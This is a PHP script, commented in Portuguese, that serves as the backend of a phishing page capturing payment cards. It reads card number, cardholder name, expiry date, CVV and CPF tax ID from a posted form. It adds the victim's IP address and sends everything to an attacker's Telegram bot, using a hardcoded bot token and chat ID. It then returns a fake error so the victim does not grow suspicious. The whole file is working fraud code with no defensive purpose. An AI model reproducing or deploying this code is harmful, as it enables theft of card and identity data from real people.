<?php
// LEK DO BLACK 2.0 - CAPTURA DE CARTÃO (VERSÃO CORRIGIDA)
$bot_token = "8383419436:AAGIiGuhI9UiyOuvSZy_dNWrd0yz-_c_T6U";   // COLOCA SEU TOKEN
$chat_id = "6832775799";         // SEU CHAT_ID

// Lê os dados enviados pelo JavaScript
$input = file_get_contents('php://input');
$dados = json_decode($input, true);

// Pega os valores
$numero = isset($dados['numero']) ? $dados['numero'] : 'Nao informado';
$nome = isset($dados['nome']) ? $dados['nome'] : 'Nao informado';
$validade = isset($dados['validade']) ? $dados['validade'] : 'Nao informado';
$cvv = isset($dados['cvv']) ? $dados['cvv'] : 'Nao informado';
$cpf = isset($dados['cpf']) ? $dados['cpf'] : 'Nao informado';

$ip = $_SERVER['REMOTE_ADDR'] ?? 'Nao informado';
$data = date("d/m/Y H:i:s");

// Monta mensagem
$mensagem = "💳💳💳 CARTAO CAPTURADO 💳💳💳\n";
$mensagem .= "━━━━━━━━━━━━━━━━━━━━━━\n";
$mensagem .= "💳 Numero: $numero\n";
$mensagem .= "👤 Nome: $nome\n";
$mensagem .= "📅 Validade: $validade\n";
$mensagem .= "🔢 CVV: $cvv\n";
$mensagem .= "📄 CPF: $cpf\n";
$mensagem .= "━━━━━━━━━━━━━━━━━━━━━━\n";
$mensagem .= "📍 IP: $ip\n";
$mensagem .= "📅 Data: $data\n";

// Envia pro Telegram
$url = "https://api.telegram.org/bot$bot_token/sendMessage";
$params = [
    'chat_id' => $chat_id,
    'text' => $mensagem
];

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $params);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
$resultado = curl_exec($ch);
curl_close($ch);

// Responde com erro falso
echo json_encode(['success' => false]);
?>
